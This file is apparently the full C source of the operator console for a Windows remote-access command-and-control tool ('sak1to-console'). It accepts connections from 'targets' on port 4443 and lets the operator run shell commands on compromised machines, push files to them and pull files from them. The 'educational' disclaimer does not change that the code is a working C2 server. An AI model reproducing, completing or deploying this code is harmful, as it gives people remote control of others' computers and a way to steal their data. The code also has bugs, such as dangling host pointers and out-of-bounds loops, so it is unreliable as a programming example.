/*
Coded by d4rkstat1c.
Use this code educationally/legally.
#GSH
*/
#include <WS2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "sakito_tools.h"

#pragma comment(lib, "ws2_32.lib")

typedef struct {
	// Client hostname.
	char* host;
	// Client socket.
	SOCKET sock;
} Conn;

typedef struct {
	SOCKET listen_socket;
	// Array of Conn objects/structures.
	Conn* clients;
	// Memory blocks allocated.
	size_t alloc;
	// Amount of memory used.
	size_t size;
} Conn_map;

// Typedef for function pointer.
typedef int (*func)(char*, size_t, SOCKET);


// Function to close specified socket.
void close_server(SOCKET socket) {
	closesocket(socket);
	WSACleanup();
}

// Function to create socket.
const SOCKET create_socket() {
	// Initialize winsock.
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	int wsResult = WSAStartup(ver, &wsData);

	// Create the server socket object.
	const SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == INVALID_SOCKET) {
		printf("Socket creation failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		exit(1);
	}

	return listen_socket;
}

// Function to bind socket to specified port.
void bind_socket(const SOCKET listen_socket, const int port) {
	// Create hint structure.
	struct sockaddr_in hint;
	hint.sin_family = AF_INET;

	hint.sin_port = htons(port);
	hint.sin_addr.S_un.S_addr = INADDR_ANY;

	// Bind ip address and port to listen_socket.
	if (bind(listen_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
		printf("Socket bind failed with error: %d\n", WSAGetLastError());
		close_server(listen_socket);
		exit(1);
	}

	// Place the listen_socket in listen state.
	listen(listen_socket, SOMAXCONN);
}

// Thread to recursively accept connections.
DWORD WINAPI accept_conns(LPVOID* lp_param) {
	Conn_map* conns = (Conn_map*)lp_param;
	conns->alloc = MEM_CHUNK;

	conns->size = 0;
	conns->clients = malloc(conns->alloc * sizeof(Conn));

	conns->listen_socket = create_socket();
	bind_socket(conns->listen_socket, 4443);

	while (1) {
		// Wait for a connection.
		struct sockaddr_in client;
		int clientSize = sizeof(client);

		// Client socket object.
		const SOCKET client_socket = accept(conns->listen_socket, (struct sockaddr*)&client, &clientSize);
		if (client_socket == INVALID_SOCKET)
			printf("Error accepting client connection.");

		// Client's remote name and client's ingress port.
		char host[NI_MAXHOST] = { 0 };
		char service[NI_MAXHOST] = { 0 };

		if (conns->size == conns->alloc)
			conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));

		// Add hostname string and client_socket object to Conn structure.
		conns->clients[conns->size].host = host;
		conns->clients[conns->size].sock = client_socket;
		conns->size++;

		if (getnameinfo((struct sockaddr*)&client, sizeof(client), host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
			printf("%s connected on port %s\n", host, service);
		}
		else {
			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
		}
	}
}

// Function to list all available connections.
void list_connections(const Conn_map* conns) {
	printf("\n\n---------------------------\n");
	printf("---  C0NNECTED TARGETS  ---\n");
	printf("--     Hostname: ID      --\n");
	printf("---------------------------\n\n");
	if (conns->size) {
		for (size_t i = 0; i < conns->size; i++) {
			printf("%s: %lu\n", conns->clients[i].host, i);
		}
		printf("\n\n");
	}
	else {
		printf("No connected targets available.\n\n\n");
	}
}

// Function to receive file from target machine (TCP file transfer).
int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// Send command to the client to be parsed.
	buf[7] = '3';
	if (send(client_socket, &buf[7], cmd_len, 0) < 1)
		return SOCKET_ERROR;

	// Open file.
	FILE* fd = fopen(&buf[8], "rb");

	uint32_t bytes = 0;
	size_t f_size = 0;

	if (fd) {
		// Get file size.
		fseek(fd, 0L, SEEK_END);
		f_size = ftell(fd);

		// Serialize f_size.
		bytes = htonl(f_size);
		fseek(fd, 0L, SEEK_SET);
	}

	if (send(client_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
		return SOCKET_ERROR;

	int iResult = 1;

	if (f_size) {
		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
		int bytes_read;
		while (!feof(fd) && iResult > 0) {
			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
				// Send file's bytes chunk to remote server.
				iResult = send(client_socket, buf, bytes_read, 0);
			}
			else {
				break;
			}
		}
		// Close the file.
		fclose(fd);
	}

	return iResult;
}

// Function to receive file from target machine (TCP file transfer).
int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// Send command to the client to be parsed.
	buf[9] = '4';
	if (send(client_socket, &buf[9], cmd_len, 0) < 1)
		return SOCKET_ERROR;

	FILE* fd = fopen(&buf[10], "wb");

	// Receive file size.
	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
		return SOCKET_ERROR;

	uint32_t f_size = ntohl_conv(&*(buf));
	int iResult = 1;

	// Receive all file bytes/chunks and write to file.
	long int total = 0;
	while (total != f_size && iResult > 0) {
		iResult = recv(client_socket, buf, BUFLEN, 0);
		fwrite(buf, 1, iResult, fd);
		total += iResult;
	}

	fclose(fd);

	return iResult;
}

// Function send change directory command to client.
int client_cd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	buf[3] = '1';
	if (send(client_socket, &buf[3], cmd_len, 0) < 1)
		return SOCKET_ERROR;

	return 1;
}

// Function to terminate/kill client.
int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	send(client_socket, "2", cmd_len, 0);

	return 0;
}

// Function to return function pointer based on parsed command.
func parse_cmd(char* const buf) {
	// Function pointer array of each c2 command.
	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
	// Array of command strings to parse stdin with.
	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };

	for (int i = 0; i < 5; i++) {
		if (compare(buf, commands[i])) {
			return func_array[i];
		}
	}

	return NULL;
}

// Function to send command to client.
int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// Send command to server.
	if (send(client_socket, buf, cmd_len, 0) < 1)
		return SOCKET_ERROR;

	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
		return SOCKET_ERROR;

	uint32_t s_size = ntohl_conv(&*(buf));

	int iResult = 1;
	// Receive command output stream and write output chunks to stdout.
	do {
		if ((iResult = recv(client_socket, buf, BUFLEN, 0)) < 1)
			return iResult;
		fwrite(buf, 1, iResult, stdout);
	} while ((s_size -= iResult) > 0);

	fputc('\n', stdout);

	return iResult;
}

// Function to resize conns array/remove and close connection.
void delete_conn(Conn_map* conns, const int client_id) {
	for (size_t i = client_id; i < conns->size; i++) {
		conns->clients[i].sock = conns->clients[i + 1].sock;
		conns->clients[i].host = conns->clients[i + 1].host;
	}

	closesocket(conns->clients[conns->size].sock);
	conns->clients[conns->size].host = NULL;
	conns->size--;
}

// Function to parse interactive input and send to specified client.
void interact(Conn_map* conns, char* const buf, const int client_id) {
	const SOCKET client_socket = conns->clients[client_id].sock;
	char* client_host = conns->clients[client_id].host;

	int iResult = 1;

	// Receive and parse input/send commands to client.
	while (iResult > 0) {
		printf("%s // ", client_host);
		// Set all bytes in buffer to zero.
		memset(buf, '\0', BUFLEN);

		size_t cmd_len = get_line(buf);
		char* cmd = &buf[1];

		if (cmd_len > 1) {
			if (compare(cmd, "background")) {
				return;
			}
			else {
				// If a command is parsed call it's corresponding function else execute-
				// the command on the client.
				func target_func = parse_cmd(cmd);
				if (target_func) {
					iResult = target_func(buf, cmd_len, client_socket);
				}
				else {
					iResult = send_cmd(buf, cmd_len, client_socket);
				}
			}
		}
	}

	// If client disconnected/exit command is parsed: delete the connection.
	delete_conn(conns, client_id);
	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
}

// Function to execute command.
void exec_cmd(char* const buf) {
	// Call Popen to execute command(s) and read the process' output.
	FILE* fpipe = _popen(buf, "r");
	fseek(fpipe, 0, SEEK_END);

	size_t cmd_len = ftell(fpipe);
	fseek(fpipe, 0, SEEK_SET);

	// Store command output.
	int rb = 0;
	do {
		rb = fread(buf, 1, BUFLEN, fpipe);
		fwrite(buf, 1, rb, stdout);
	} while (rb == BUFLEN);

	fputc('\n', stdout);

	// Close the pipe.
	_pclose(fpipe);
}

// Main function for parsing console input and calling sakito-console functions.
int main(void) {
	Conn_map conns;
	HANDLE acp_thread = CreateThread(0, 0, accept_conns, &conns, 0, 0);

	HANDLE  hColor;

	hColor = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hColor, 9);

	while (1) {
		printf("sak1to-console // ");
		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
		char buf[BUFLEN + 1] = { 0 };

		size_t cmd_len = get_line(buf);
		char* cmd = &buf[1];

		if (cmd_len > 1) {
			if (compare(cmd, "exit")) {
				// Quit accepting connections.
				TerminateThread(acp_thread, 0);
				// if there's any connections close them before exiting.
				if (conns.size) {
					for (size_t i = 0; i < conns.size; i++) {
						closesocket(conns.clients[i].sock);
					}
					// Free allocated memory.
					free(conns.clients);
				}
				close_server(conns.listen_socket);
				return;
			}
			else if (compare(cmd, "cd ")) {
				// List all connections.
				_chdir(&cmd[3]);
			}
			else if (compare(cmd, "list")) {
				// List all connections.
				list_connections(&conns);
			}
			else if (compare(cmd, "interact ")) {
				// Interact with client.
				int client_id;
				client_id = atoi(&cmd[9]);
				if (!conns.size || client_id < 0 || client_id > conns.size - 1) {
					printf("Invalid client identifier.\n");
				}
				else {
					interact(&conns, buf, client_id);
				}
			}
			else {
				// Execute command on host system.
				exec_cmd(cmd);
			}
		}
	}
	return 0;
}
